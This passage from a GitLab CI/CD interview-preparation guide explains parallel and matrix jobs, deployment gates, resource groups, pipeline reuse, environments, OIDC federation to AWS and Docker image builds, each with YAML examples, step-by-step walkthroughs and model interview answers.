1. The suite has 400 tests and takes 20 minutes in one job.
2. `parallel: 4` creates 4 jobs. Job `test 2/4` has `CI_NODE_INDEX=2`, `CI_NODE_TOTAL=4`, and `pytest-split` gives it about 100 tests (balanced by recorded durations).
3. With 4 free runners, all four finish in about 5–6 minutes. With only 1 free runner they queue and you save nothing.
4. The matrix creates 6 jobs, such as `build: [api, arm64]`; that one gets `SERVICE=api`, `ARCH=arm64`, and runs on a runner tagged `arm64`.

**Common mistake → fix:** `parallel: 4` with a plain `pytest` command: each of the four jobs runs **all** 400 tests, using 4× the compute for no gain. Fix: pass `CI_NODE_INDEX`/`CI_NODE_TOTAL` to a splitting tool.

**Interview answer:** "parallel: N clones a job N times with CI_NODE_INDEX and CI_NODE_TOTAL so a test splitter can divide the suite; parallel:matrix creates one job per combination of variable values, like services times architectures. Both cap at 200 jobs, and they only help if there are enough runners and the work is actually split."

**Follow-ups:**
- *How do later jobs `need` one matrix job?* `needs: [{ job: build, parallel: { matrix: [{ SERVICE: api, ARCH: arm64 }] } }]`.

---

### Q28. Manual jobs, delayed jobs and deployment approvals

**Short answer:** **`when: manual`** adds a job that waits for someone to click ▶ (play), which is the usual gate before production. **`when: delayed`** with `start_in` runs a job after a timer, e.g. a rollout step 30 minutes later. For real control, combine manual jobs with **protected environments** (only certain users or groups may deploy) and **deployment approvals** (N people must approve before the job runs).

**How it works:**
- A manual job defined **outside** `rules` is non-blocking (`allow_failure: true` is implied): the pipeline can finish as passed while it waits. A manual job set **inside** `rules` defaults to `allow_failure: false`, so the pipeline shows "blocked" until someone runs it. Set `allow_failure` explicitly to make the intent clear.
- Protected environments are configured in Settings → CI/CD → Protected environments: who can deploy and how many approvals are required.
- `start_in` accepts up to one week; the timer starts when the job's stage starts.

**Example:**
```yaml
deploy-prod:
  stage: deploy
  script: ./deploy.sh production
  environment: production            # protected: Deployers = "release-managers", 2 approvals
  rules:
    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
      when: manual
      allow_failure: false           # pipeline shows "blocked" until deployed

shift-traffic-50:
  stage: rollout
  script: ./shift.sh 50
  rules:
    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
      when: delayed
      start_in: 30 minutes
```

**What happens, step by step:**
1. The `main` pipeline reaches `deploy-prod`. It's manual and blocking, so the pipeline status is **blocked**.
2. A developer outside `release-managers` sees the play button disabled.
3. Two approvers approve the deployment on the environment page; a release manager clicks play; the job runs.
4. When the `rollout` stage starts, `shift-traffic-50` shows a countdown and runs 30 minutes later, unless someone cancels it.

**Common mistake → fix:** relying on `when: manual` alone as a production control. Anyone with Developer access to the project can click play. Fix: protect the environment (allowed deployers plus approvals) and run deploy jobs on protected runners.

**Interview answer:** "when: manual makes a job wait for a click, and when it's blocking the pipeline stays blocked until it runs; when: delayed with start_in schedules it. A manual button isn't access control by itself, so for production I use protected environments to restrict who can deploy and require approvals, which also creates an audit trail."

**Follow-ups:**
- *Can you pass variables to a manual job?* Yes, the play dialog lets you set manual job variables, which have high precedence.

---

### Q29. `resource_group`: preventing concurrent deployments

**Short answer:** **`resource_group`** makes jobs **mutually exclusive across pipelines**: only one job with the same resource group name runs at a time; others wait in a queue. Use it for anything that must not run twice at once, such as deploying to one environment or running `terraform apply` on one state.

**How it works:**
- Like a lock (semaphore): when the group is busy, other jobs in that group show "waiting for resource".
- The **process mode** decides which waiting job goes next: `unordered` (default), `oldest_first`, `newest_first`, or `newest_ready_first`. The mode is changed through the resource groups API, not in YAML.

**Example:**
```yaml
deploy-prod:
  stage: deploy
  script: ./deploy.sh production
  environment: production
  resource_group: production
```

```flow
trace: Three pipelines deploy to production close together
pipelines 101, 102, 103 reach deploy-prod within a minute > All three deploy jobs want the resource group named production.
deploy-101 **running**; 102 and 103 **waiting for resource** > Only one job in the group may run at a time.
deploy-101 finishes > The lock is released and the process mode picks the next job.
oldest_first runs 102 then 103; newest_first runs **103** first > With newest_first, the stale deploys run afterwards unless they are skipped, so each deploy must be safe to re-run.
```

**What happens, step by step:**
1. Three merges land in one minute; pipelines 101, 102, 103 each reach `deploy-prod`.
2. 101's job takes the lock and runs. 102 and 103 wait instead of deploying simultaneously.
3. When 101 finishes, the next job is chosen by the process mode. With `oldest_first`, deployments happen in commit order 102 then 103.
4. Without `resource_group`, all three would run together: two `terraform apply` runs could fight over state, or ECS could receive three overlapping updates.

**Common mistake → fix:** one resource group for all environments (`resource_group: deploy`). A staging deploy then blocks a production hotfix. Fix: one group per target, e.g. `resource_group: $CI_ENVIRONMENT_NAME` or `production`, `staging`.

**Interview answer:** "resource_group is a cross-pipeline lock: jobs sharing the name run one at a time. I put each environment's deploy and Terraform apply in its own group so overlapping pipelines can't deploy concurrently. The process mode, set through the API, controls order: oldest_first for strict ordering, newest_first to prioritise the latest commit."

**Follow-ups:**
- *Does it replace Terraform state locking?* No, it complements it: state locking protects state from any client; `resource_group` prevents the pipeline from even trying.

---

### Q30. `interruptible` and auto-cancelling redundant pipelines

**Short answer:** When you push a new commit to a branch, the pipeline for the previous commit is usually pointless. **Auto-cancel redundant pipelines** cancels it, and **`interruptible: true`** marks which jobs are safe to cancel mid-run. Never mark deploy jobs interruptible: cancelling a deploy half-way can leave an environment broken.

**How it works:**
- `workflow:auto_cancel:on_new_commit` controls the behaviour: `conservative` (default: cancel only if no non-interruptible job has started), `interruptible` (cancel only jobs marked `interruptible: true`), or `none`.
- `interruptible` defaults to `false`.
- `workflow:auto_cancel:on_job_failure: all` cancels the rest of the pipeline as soon as one job fails (fail fast).

**Example:**
```yaml
workflow:
  auto_cancel:
    on_new_commit: interruptible

default:
  interruptible: true          # all jobs cancellable by default…

deploy-dev:
  interruptible: false         # …except the deploy
  script: ./deploy.sh dev
```

**What happens, step by step:**
1. Push commit A to `feature/x`; pipeline 201 starts lint, tests (8 minutes).
2. Two minutes later you push commit B; pipeline 202 starts.
3. Pipeline 201's lint and test jobs are interruptible, so GitLab cancels them, freeing the runners.
4. If 201 had already reached `deploy-dev` (not interruptible), that job continues to completion.

**Common mistake → fix:** `default: interruptible: true` with no override on deploys; a quick follow-up push cancels a production database migration halfway. Fix: set `interruptible: false` on every deploy and migration job, or disable auto-cancel for protected branches with `workflow:rules:auto_cancel`.

**Interview answer:** "Auto-cancel stops outdated pipelines when a new commit lands on the same branch, which saves runner time. interruptible marks jobs that are safe to cancel; I set it on tests and builds but never on deploys or migrations, and I configure workflow:auto_cancel:on_new_commit accordingly, often turning it off on protected branches."

**Follow-ups:**
- *Does auto-cancel apply to `main`?* It can; many teams disable it on protected branches so every `main` commit is fully tested and deployed.

---

### Q31. Parent-child and multi-project pipelines

**Short answer:** A **trigger job** can start another pipeline. A **parent-child pipeline** runs a second configuration file from the **same project** as a child pipeline, which is useful to split a big monorepo pipeline per component, or to run a YAML file **generated** by an earlier job. A **multi-project (downstream) pipeline** starts a pipeline in **another project**, e.g. an app repo triggering a deployment repo. With `strategy: mirror` (or the older `depend`), the trigger job waits for and reflects the downstream result.

**How it works:**
- `trigger: include: path.yml` → child pipeline in the same project.
- `trigger: project: group/other` → pipeline in another project (you need permission to run pipelines there).
- Without a strategy, the trigger job succeeds as soon as the downstream pipeline is **created**, even if it later fails.

**Example:**
```yaml
api-pipeline:
  trigger:
    include: services/api/.gitlab-ci.yml
    strategy: mirror
  rules:
    - changes: [services/api/**/*]

deploy-infra:
  stage: deploy
  trigger:
    project: platform/infra-deploy
    branch: main
    strategy: mirror
  variables:
    APP_IMAGE: $CI_REGISTRY_IMAGE:$CI_COMMIT_SHA
```

```flow
pipeline: Parent pipeline for a monorepo commit that changed services/api
stage: Parent pipeline
Evaluate rules > Only services/api changed, so api-pipeline is added and the web trigger is not.
api-pipeline trigger job > Creates a child pipeline from services/api/.gitlab-ci.yml.
stage: Child pipeline
Child runs build, test, publish > It has its own stages and its own job list, shown nested under the parent.
stage: Back in the parent
Trigger job mirrors the child > With strategy mirror the trigger job passes or fails exactly as the child did.
deploy-infra triggers platform/infra-deploy > A multi-project pipeline receives APP_IMAGE and deploys it.
```

**What happens, step by step:**
1. A commit changes `services/api/handlers.py`. `api-pipeline`'s rule matches, so the parent runs it.
2. The child pipeline runs api's own build and tests, shown nested under the parent.
3. A child test fails → with `strategy: mirror`, `api-pipeline` is marked failed too, and the parent stops before deploy.
4. On success, `deploy-infra` starts a pipeline in `platform/infra-deploy` with `APP_IMAGE=registry.example.com/shop/api:3f2a9c1…`, and again mirrors its result.

**Common mistake → fix:** forgetting the strategy. The trigger job goes green immediately, the parent pipeline shows **passed**, and nobody notices the child failed. Fix: `strategy: mirror` (or `depend` on older GitLab versions).

**Interview answer:** "Trigger jobs start downstream pipelines: parent-child for splitting or dynamically generating config in the same project, and multi-project for crossing repos, like an app triggering a deployment repository. I always set strategy: mirror or depend so the parent reflects the downstream result, and pass data with trigger variables."

**Follow-ups:**
- *What's a dynamic child pipeline?* A job generates a YAML file (e.g. one job per changed service) and saves it as an artifact; a trigger job runs it with `trigger: include: - artifact: generated.yml, job: generate`.

---

### Q32. `retry`, `timeout` and `allow_failure`

**Short answer:** Three reliability knobs per job. **`retry`** re-runs a failed job automatically (at most 2 extra times), ideally only for **infrastructure** failures, not test failures. **`timeout`** kills a job that runs too long, so a hung test doesn't block a runner for the default hour. **`allow_failure`** lets a job fail without failing the pipeline, optionally only for specific exit codes.

**How it works:**
- `retry: { max: 2, when: [runner_system_failure, stuck_or_timeout_failure] }` retries only for those failure reasons; plain `retry: 2` retries on **any** failure.
- `timeout: 20m` overrides the project's default job timeout (60 minutes unless changed) but can't exceed the runner's maximum.
- `allow_failure: { exit_codes: [3] }` → exit code 3 counts as "allowed failure" (warning), any other non-zero exit code fails the pipeline.

**Example:**
```yaml
integration-tests:
  timeout: 20m
  retry:
    max: 2
    when: [runner_system_failure, stuck_or_timeout_failure, api_failure]
  script: ./run-integration.sh

dependency-audit:
  script: ./audit.sh        # exits 3 when only low-severity issues are found
  allow_failure:
    exit_codes: [3]
```

**What happens, step by step:**
1. `integration-tests` runner VM is reclaimed mid-job → failure reason `runner_system_failure` → GitLab retries automatically on another runner.
2. A test assertion fails → reason `script_failure`, not in the list → no retry; the pipeline fails and the developer looks at it.
3. A test hangs; at 20 minutes the job is killed (reason `stuck_or_timeout_failure`) and retried; if it hangs twice more, it fails for good.
4. `dependency-audit` exits 3 → orange warning, pipeline continues. It exits 1 on a critical finding → pipeline fails.

**Common mistake → fix:** `retry: 2` on a flaky test job. Real bugs that fail intermittently get retried until they pass and ship. Fix: retry only infrastructure failure reasons, and fix or quarantine flaky tests (Q51).

**Interview answer:** "I use retry with an explicit when list for infrastructure failures like runner_system_failure, never for script failures, so real bugs aren't hidden. timeout caps hung jobs below the default hour. allow_failure is for genuinely non-blocking checks, ideally restricted with exit_codes so only the expected soft failure is tolerated."

**Follow-ups:**
- *Max retries?* `retry:max` is 0, 1 or 2.

---

## 5. Reuse & structure

### Q33. `include`, `extends`, YAML anchors and `!reference`

**Short answer:** Four ways to avoid copy-paste in pipeline config. **`include`** pulls in YAML from other files (local, another project, a URL, a template). **`extends`** lets a job inherit the keys of another job, usually a **hidden job** (name starts with `.`, so it never runs). **YAML anchors** (`&name` / `<<: *name`) copy blocks within one file. **`!reference`** reuses a specific section (like a `script` list) from another job, even across included files.

**How it works:**
- `include` merges the files into one configuration before anything else is evaluated. Pin cross-project includes to a tag or commit (`ref: v3.2.0`), or a change upstream silently changes your pipeline.
- `extends` deep-merges hashes; the job's own keys win. **Arrays are replaced, not merged** (a job's `script` replaces the template's).
- Anchors only work within a single file; `extends` and `!reference` work across includes.

**Example:**
```yaml
include:
  - project: platform/ci-templates
    ref: v3.2.0
    file: /python.yml
  - local: /ci/deploy.yml

.python-base:
  image: python:3.13-slim
  before_script:
    - pip install -r requirements.txt
  variables:
    PYTHONDONTWRITEBYTECODE: "1"

unit:
  extends: .python-base
  script: pytest

lint:
  extends: .python-base
  before_script:
    - !reference [.python-base, before_script]
    - pip install ruff
  script: ruff check .
```

**What happens, step by step:**
1. GitLab fetches `/python.yml` from `platform/ci-templates` at tag `v3.2.0` and `/ci/deploy.yml` from this repo, and merges them in.
2. `unit` gets `image`, `before_script` and `variables` from `.python-base`, plus its own `script`.
3. `lint` defines its own `before_script`, which would **replace** the template's list. `!reference` pulls the template's lines in first, so the final list is `pip install -r requirements.txt`, then `pip install ruff`.
4. `.python-base` itself never runs because its name starts with a dot.

**Common mistake → fix:** expecting `extends` to append to `script` or `before_script`; the job's list replaces the template's and setup silently disappears. Fix: `!reference` to combine lists, and check the result in the pipeline editor's **Full configuration** tab.

**Interview answer:** "include assembles config from multiple files and projects, pinned to a version; extends lets jobs inherit from hidden template jobs with a deep merge where arrays are replaced; anchors work only inside one file; !reference reuses specific sections like a script list across files. I verify the merged result in the pipeline editor's full configuration view."

**Follow-ups:**
- *Why prefer components over plain includes?* Components (Q34) add versioning, typed inputs and discoverability in the CI/CD Catalog.

---

### Q34. CI/CD components and the CI/CD Catalog

**Short answer:** A **CI/CD component** is a reusable, **versioned** piece of pipeline configuration (one or more jobs) with typed **inputs**, published from a component project. The **CI/CD Catalog** lists published components so teams can find and reuse them. Compared with copy-pasted templates, you get semantic versions, documented inputs validated at pipeline creation, and controlled upgrades.

**How it works:**
1. A component project has files under `templates/` (e.g. `templates/docker-build.yml`). Each starts with a `spec: inputs:` header, then `---`, then the jobs.
2. Releasing a tag like `2.1.0` publishes that version to the Catalog.
3. Consumers write `include: - component: <host>/<project path>/<component name>@<version>` with `inputs:`.
4. GitLab replaces `$[[ inputs.x ]]` with the values when the pipeline is created; missing required inputs or wrong types fail validation immediately.

**Example:**
```yaml
# Component project: templates/docker-build.yml
spec:
  inputs:
    image_name:
      type: string
    dockerfile:
      type: string
      default: Dockerfile
    stage:
      default: build
---
docker-build:
  stage: $[[ inputs.stage ]]
  image: docker:27
  services: [docker:27-dind]
  script:
    - docker build -f $[[ inputs.dockerfile ]] -t $[[ inputs.image_name ]]:$CI_COMMIT_SHA .
    - docker push $[[ inputs.image_name ]]:$CI_COMMIT_SHA
```
```yaml
# Consumer project: .gitlab-ci.yml
include:
  - component: $CI_SERVER_FQDN/platform/components/docker-build@2.1.0
    inputs:
      image_name: $CI_REGISTRY_IMAGE/api
      dockerfile: services/api/Dockerfile
```

**What happens, step by step:**
1. GitLab fetches `templates/docker-build.yml` at version `2.1.0`.
2. It checks inputs: `image_name` is given; `dockerfile` is given; `stage` falls back to `build`.
3. It substitutes values, so the job's script becomes `docker build -f services/api/Dockerfile -t $CI_REGISTRY_IMAGE/api:$CI_COMMIT_SHA .` (the `$CI_…` variables are expanded later, at job runtime).
4. When the platform team releases `2.2.0`, nothing changes for this project until someone bumps the version in an MR.

**Common mistake → fix:** referencing `@main` or `@~latest` in production pipelines; a breaking change in the component breaks every consumer at once. Fix: pin a full version (`@2.1.0`), or at least a major line, and upgrade deliberately.

**Interview answer:** "Components are versioned, reusable pipeline building blocks with typed inputs, published from a component project to the CI/CD Catalog. Consumers include them with component path at version and pass inputs, which are validated at pipeline creation. They beat copy-pasted templates because of versioning, documentation and controlled upgrades."

**Follow-ups:**
- *Inputs vs variables?* Inputs are resolved when the pipeline is created and are typed; variables are resolved when jobs run and can be overridden by higher-precedence sources.

---

### Q35. What are `spec:inputs` for pipelines?

**Short answer:** Not just components: any pipeline configuration file (the main `.gitlab-ci.yml` or an included file) can declare **inputs** in a `spec:` header. Inputs have a type (`string`, `number`, `boolean`, `array`), defaults, allowed `options` or a `regex`, and are validated **when the pipeline is created**. They are a safer alternative to free-form variables for manually triggered, scheduled or API-triggered pipelines.

**How it works:**
- Inputs without a default are mandatory.
- Values come from the Run pipeline form, a schedule, the API, a trigger, or the `include:` that pulls the file in.
- `$[[ inputs.name ]]` is replaced in the YAML text before jobs exist, so inputs can even set job names, stages or rules.

**Example:**
```yaml
spec:
  inputs:
    environment:
      options: [dev, staging, prod]
      default: dev
    run_load_tests:
      type: boolean
      default: false
---
deploy:
  script: ./deploy.sh $[[ inputs.environment ]]
  environment: $[[ inputs.environment ]]

load-test:
  script: k6 run load.js
  rules:
    - if: '"$[[ inputs.run_load_tests ]]" == "true"'
```

**What happens, step by step:**
1. Someone opens Run pipeline; the form shows `environment` as a dropdown (dev, staging, prod) and `run_load_tests` as a checkbox.
2. They choose `staging` and tick the box. GitLab substitutes the values: the deploy job runs `./deploy.sh staging` and `load-test` is included.
3. An API call with `environment=production` is **rejected** before any job is created, because it's not one of the options.
4. A normal push uses the defaults: `dev`, no load tests.

**Common mistake → fix:** using a free-text variable `DEPLOY_ENV` that anyone can set to anything, including typos like `prdo` that fall through to unexpected branches of a script. Fix: typed inputs with `options`.

**Interview answer:** "Pipeline inputs are declared in a spec header with types, defaults, options or regex, and validated when the pipeline is created, so a bad value fails before any job runs. They're interpolated into the YAML with dollar-double-bracket syntax, and they can't be overridden by project or group variables, which makes them safer than free-form variables for manual and API-triggered runs."

**Follow-ups:**
- *Can inputs change which jobs exist?* Yes, because substitution happens before rules are evaluated; you can use them in job names, `rules`, `stage` and more.

---

### Q36. How do you structure CI for a monorepo?

**Short answer:** In a monorepo (many services in one repository), the goal is to **build and test only what changed**, while still catching cross-service breakage. Use `rules:changes` (with `compare_to` in MR pipelines) to skip unaffected work, **parent-child pipelines** per service so each team owns its config, **shared components** for common steps, caches keyed per service lockfile, and a full run on `main` or nightly.

**How it works:**
1. The root `.gitlab-ci.yml` holds one trigger job per service, each with `rules:changes` for that service's folder plus shared folders it depends on.
2. Each service has its own child config (`services/api/.gitlab-ci.yml`) built from shared components.
3. MR pipelines compare against the target branch, so a change counts as "changed" relative to `main`, not just relative to the last push.

**Example:**
```yaml
api:
  trigger: { include: services/api/.gitlab-ci.yml, strategy: mirror }
  rules:
    - if: $CI_PIPELINE_SOURCE == "schedule"           # nightly: run everything
    - changes:
        paths: ["services/api/**/*", "libs/shared/**/*"]
        compare_to: refs/heads/main

web:
  trigger: { include: services/web/.gitlab-ci.yml, strategy: mirror }
  rules:
    - if: $CI_PIPELINE_SOURCE == "schedule"
    - changes:
        paths: ["services/web/**/*", "libs/shared/**/*"]
        compare_to: refs/heads/main
```

**What happens, step by step:**
1. An MR changes `services/web/cart.tsx`. Compared with `main`, only `services/web/**` changed → only the `web` child pipeline runs (about 6 minutes instead of 25 for everything).
2. Another MR changes `libs/shared/money.py`. Both rules match → both child pipelines run, because both services use the shared library.
3. The nightly schedule runs both regardless, catching anything the path rules missed.

**Common mistake → fix:** path rules that forget shared dependencies (only `services/api/**`), so a change to `libs/shared` skips the tests of the services that use it. Fix: include shared paths in each service's rules, or generate the dependency list from the build tool (a dynamic child pipeline), and keep a full run on `main` or nightly.

**Interview answer:** "For a monorepo I run only what's affected: rules:changes with compare_to the target branch, a child pipeline per service so teams own their config, shared components for common steps and per-service caches. I include shared library paths in the change rules and run the full suite on main or nightly to catch anything the rules miss."

**Follow-ups:**
- *How do you avoid repeating the rules for 20 services?* Generate the child pipeline config in a job (a dynamic child pipeline) or wrap the trigger job in a component with a `service` input.

---
## 6. Environments & deployments to AWS

### Q37. What is an environment, and what are protected environments?

**Short answer:** An **environment** is GitLab's record of a place your code is deployed to, such as `staging` or `production`. A job with `environment: production` creates a **deployment** entry: which commit, which pipeline, who triggered it, when, and the URL. That gives you a deployment history, "what's running in production right now", and a re-deploy (rollback) button. **Protected environments** restrict who can deploy there and can require approvals.

**How it works:**
- `environment:name` identifies it; `url` adds a link in MRs and the environment page; `deployment_tier` classifies it (`production`, `staging`, `testing`, `development`, `other`).
- Environment-scoped variables are injected only into jobs deploying to that environment (Q22).
- Protected environment settings: allowed deployers (users, groups, roles) and required approval count.
- Rollback: on the environment page, re-run the deploy job of an earlier successful deployment.

**Example:**
```yaml
deploy-staging:
  stage: deploy
  script: ./deploy.sh staging $CI_COMMIT_SHA
  environment:
    name: staging
    url: https://staging.shop.example.com
  rules:
    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH

deploy-prod:
  stage: deploy
  script: ./deploy.sh production $CI_COMMIT_SHA
  environment:
    name: production
    url: https://shop.example.com
    deployment_tier: production
  resource_group: production
  rules:
    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
      when: manual
```

**What happens, step by step:**
1. Commit `3f2a9c1` merges to `main`; `deploy-staging` runs and the staging environment shows "Deployment #57, 3f2a9c1, by Asha, 2 minutes ago".
2. A release manager runs `deploy-prod`. Because `production` is protected with one required approval, the job waits until someone approves.
3. After it succeeds, the production environment shows `3f2a9c1` as current, and the MR shows "Deployed to production".
4. An error spike appears. On the production environment page, someone clicks **Re-deploy** on deployment #56 (`9e81b07`); its deploy job runs again and production is back on the previous version within minutes.

**Common mistake → fix:** rollback by re-deploying an old pipeline whose job **rebuilds** from source; the "old" version now pulls newer dependencies and isn't what ran before. Fix: deploy jobs should deploy an immutable artifact (image digest) produced earlier (Q43, Q44), so re-running them is an exact rollback.

**Interview answer:** "An environment is GitLab's record of a deployment target; any job with environment set creates a deployment entry with commit, pipeline, user and time, giving history, current version and one-click re-deploy. I protect production so only specific groups can deploy, require approvals, scope secrets to the environment, and make deploy jobs deploy immutable artifacts so a re-deploy is a true rollback."

**Follow-ups:**
- *What is `environment:action`?* `start` (default) records a deployment; `prepare`, `verify` and `access` don't; `stop` stops an environment (see Q38).

---

### Q38. Dynamic environments and review apps

**Short answer:** A **dynamic environment** has a name built from variables, such as `review/$CI_COMMIT_REF_SLUG`, so **each branch gets its own temporary environment**. A **review app** is the typical use: every MR is deployed to its own URL so reviewers can click through the change. A paired **stop job** (`on_stop`) tears it down when the MR is merged or closed, and `auto_stop_in` cleans up forgotten ones.

**How it works:**
1. The deploy job uses `environment: name: review/$CI_COMMIT_REF_SLUG` (a URL-safe version of the branch name) and `on_stop: stop-review`.
2. The stop job uses the same environment name with `action: stop` and `when: manual`.
3. When the MR is merged or the branch deleted, GitLab runs the stop job automatically. `auto_stop_in: 3 days` stops it after three days of no new deployments.

**Example:**
```yaml
deploy-review:
  stage: deploy
  script: ./deploy-review.sh "$CI_COMMIT_REF_SLUG"
  environment:
    name: review/$CI_COMMIT_REF_SLUG
    url: https://$CI_COMMIT_REF_SLUG.review.shop.example.com
    on_stop: stop-review
    auto_stop_in: 3 days
  rules:
    - if: $CI_PIPELINE_SOURCE == "merge_request_event"

stop-review:
  stage: deploy
  script: ./destroy-review.sh "$CI_COMMIT_REF_SLUG"
  environment:
    name: review/$CI_COMMIT_REF_SLUG
    action: stop
  rules:
    - if: $CI_PIPELINE_SOURCE == "merge_request_event"
      when: manual
```

**What happens, step by step:**
1. MR !42 from branch `feature/New-Cart` runs `deploy-review`. `CI_COMMIT_REF_SLUG` is `feature-new-cart` (lowercased, special characters replaced by `-`).
2. The environment `review/feature-new-cart` appears, and the MR shows a "View app" link to `https://feature-new-cart.review.shop.example.com`.
3. Each new push redeploys to the same environment, resetting the 3-day timer.
4. The MR merges; GitLab runs `stop-review`, which deletes the app's resources, and the environment is marked stopped.

**Common mistake → fix:** forgetting `on_stop` or giving the stop job a different environment name. Review apps pile up for months and cost real money. Fix: same name in both jobs, `on_stop`, plus `auto_stop_in` as a safety net.

**Interview answer:** "Dynamic environments use variables in the name, typically review/CI_COMMIT_REF_SLUG, so every MR gets its own review app with a link in the MR. A stop job with action: stop, wired via on_stop, cleans it up when the MR merges or closes, and auto_stop_in removes stale ones. It lets reviewers test real behaviour before merge without a shared, constantly broken staging."

**Follow-ups:**
- *What does the stop job need to check out?* If the branch is deleted, the stop job may run without its branch; set `GIT_STRATEGY: none` and keep the teardown script independent of the branch's files.

---

### Q39. OIDC federation from GitLab to AWS (no stored keys)

**Short answer:** Instead of storing an AWS access key in a GitLab variable, the job asks GitLab for a signed **ID token** (a JSON Web Token, or JWT: a signed set of facts like "project `payments/api`, branch `main`"). AWS is configured to trust GitLab as an **OIDC identity provider** (OpenID Connect: a standard for proving identity with signed tokens). The job exchanges the token for **temporary AWS credentials** via `sts:AssumeRoleWithWebIdentity`, and the IAM role's **trust policy** decides which projects and branches may assume it. Nothing long-lived exists to leak.

**How it works:**
1. One-time setup in AWS: create an IAM OIDC identity provider for your GitLab URL, and a role whose trust policy checks the token's claims.
2. In the job, `id_tokens:` asks GitLab to mint a JWT with the audience (`aud`) you specify.
3. The job calls STS with the role ARN and the token. STS checks the signature with GitLab's public keys and checks the conditions in the trust policy.
4. STS returns credentials valid for the requested duration (up to the role's maximum, often 1 hour).

**Example:**
```yaml
deploy-prod:
  image:
    name: amazon/aws-cli:2.17.0
    entrypoint: [""]
  id_tokens:
    GITLAB_OIDC_TOKEN:
      aud: https://gitlab.example.com
  script:
    - >
      export $(printf "AWS_ACCESS_KEY_ID=%s AWS_SECRET_ACCESS_KEY=%s AWS_SESSION_TOKEN=%s"
      $(aws sts assume-role-with-web-identity
      --role-arn "$PROD_ROLE_ARN"
      --role-session-name "gitlab-$CI_PIPELINE_ID"
      --web-identity-token "$GITLAB_OIDC_TOKEN"
      --duration-seconds 3600
      --query 'Credentials.[AccessKeyId,SecretAccessKey,SessionToken]'
      --output text))
    - aws sts get-caller-identity
    - aws ecs update-service --cluster prod --service api --force-new-deployment
  environment: production
  rules:
    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
```
IAM role trust policy:
```json
{
  "Effect": "Allow",
  "Principal": { "Federated": "arn:aws:iam::123456789012:oidc-provider/gitlab.example.com" },
  "Action": "sts:AssumeRoleWithWebIdentity",
  "Condition": {
    "StringEquals": {
      "gitlab.example.com:aud": "https://gitlab.example.com",
      "gitlab.example.com:sub": "project_path:payments/api:ref_type:branch:ref:main"
    }
  }
}
```

```flow
sequence: A production deploy job gets AWS credentials without stored keys
actors: Job, GitLab, AWS STS, Amazon ECS
Job -> GitLab: id_tokens: mint a JWT with aud https://gitlab.example.com
GitLab --> Job: signed JWT, sub = project_path:payments/api:ref_type:branch:ref:main
Job -> AWS STS: AssumeRoleWithWebIdentity(prod role, JWT)
AWS STS -> AWS STS: verify the signature, then check aud and sub against the trust policy
AWS STS --> Job: temporary credentials valid for 3600 seconds
Job -> Amazon ECS: update-service with the temporary credentials
```

**What happens, step by step:**
1. The job starts on `main`. GitLab injects `GITLAB_OIDC_TOKEN`, a JWT whose `sub` claim is `project_path:payments/api:ref_type:branch:ref:main`.
2. `assume-role-with-web-identity` sends it to STS. AWS fetches GitLab's public signing keys, verifies the signature and checks `aud` and `sub` exactly match.
3. STS returns three values; the `export` line turns them into environment variables the AWS CLI reads.
4. `get-caller-identity` prints the assumed role, e.g. `arn:aws:sts::123456789012:assumed-role/gitlab-prod-deploy/gitlab-88231`.
5. The same job on branch `feature/x` gets a token with `ref:feature/x`; the `sub` condition fails and STS returns `AccessDenied`, which is exactly what you want.

**Common mistake → fix:** a trust policy that checks only `aud`. Every project on that GitLab instance can mint a token with that audience and assume your production role. Fix: always restrict `sub` to the exact project and protected ref (and consider `ref_protected` and `environment` claims); use separate roles for plan or read-only work and for deploys.

**Interview answer:** "GitLab mints a signed JWT per job through id_tokens; AWS trusts GitLab as an OIDC provider, and the job exchanges the token with AssumeRoleWithWebIdentity for short-lived credentials. The IAM trust policy pins the audience and the sub claim to the exact project and branch, so only main of that project can assume the production role. No static keys exist to rotate or leak."

**Follow-ups:**
- *Why `entrypoint: [""]` on the AWS CLI image?* That image's entrypoint is `aws`, which would swallow the job's shell commands; clearing it lets the runner run the script normally.
- *What's in the `sub` claim for tags?* `ref_type:tag:ref:v1.4.2`, so you can trust only release tags for production.

---

### Q40. How do you build and tag a Docker image in GitLab CI?

**Short answer:** Build the image in a job, tag it with the **commit SHA** (immutable and traceable to the exact code), push it to a registry (GitLab's built-in Container Registry or Amazon ECR), and deploy by **digest** (`sha256:…`, the content hash, which can never point to different content). Use registry-backed layer caching for speed, and prefer **rootless builders** (BuildKit rootless, Kaniko-style tools, Buildah) over Docker-in-Docker, which needs privileged runners.

**How it works:**
- `CI_REGISTRY`, `CI_REGISTRY_IMAGE`, `CI_REGISTRY_USER` and `CI_REGISTRY_PASSWORD` are predefined for the project's Container Registry.
- Docker-in-Docker (`services: [docker:dind]`) runs a Docker daemon in a service container. It needs `privileged = true` on the runner, which gives the job root-level access to the host.
- `--cache-from`/`--cache-to type=registry` stores build layers in the registry so the next build on any runner reuses them.

**Example:**
```yaml
build-image:
  stage: build
  image: docker:27
  services: [docker:27-dind]
  variables:
    DOCKER_TLS_CERTDIR: "/certs"
    IMAGE: $CI_REGISTRY_IMAGE/api
  script:
    - echo "$CI_REGISTRY_PASSWORD" | docker login -u "$CI_REGISTRY_USER" --password-stdin "$CI_REGISTRY"
    - docker buildx create --use
    - docker buildx build
        --cache-from type=registry,ref=$IMAGE:buildcache
        --cache-to type=registry,ref=$IMAGE:buildcache,mode=max
        -t $IMAGE:$CI_COMMIT_SHA
        --push
        --metadata-file meta.json .
    - echo "IMAGE_DIGEST=$(grep -o 'sha256:[a-f0-9]*' meta.json | head -1)" >> build.env
  artifacts:
    reports:
      dotenv: build.env
```

**What happens, step by step:**
1. The job logs in to the project registry with the per-job credentials.
2. BuildKit pulls cached layers from `api:buildcache`. Only the layers after the changed source files rebuild, so 6 minutes becomes about 1 minute.
3. It pushes `registry.example.com/shop/api:3f2a9c1e…` (full commit SHA) and writes the digest, e.g. `sha256:ab12…`, to `meta.json`.
4. The `dotenv` report exposes `IMAGE_DIGEST=sha256:ab12…` to later jobs, which deploy `registry.example.com/shop/api@sha256:ab12…`.

**Common mistake → fix:** tagging only `:latest` and deploying `:latest`. You can't tell what's running, a rollback has nothing to point at, and a later push changes what "latest" means mid-rollout. Fix: SHA tags for traceability, digests for deployment, semver tags (`v1.4.2`) added on release.

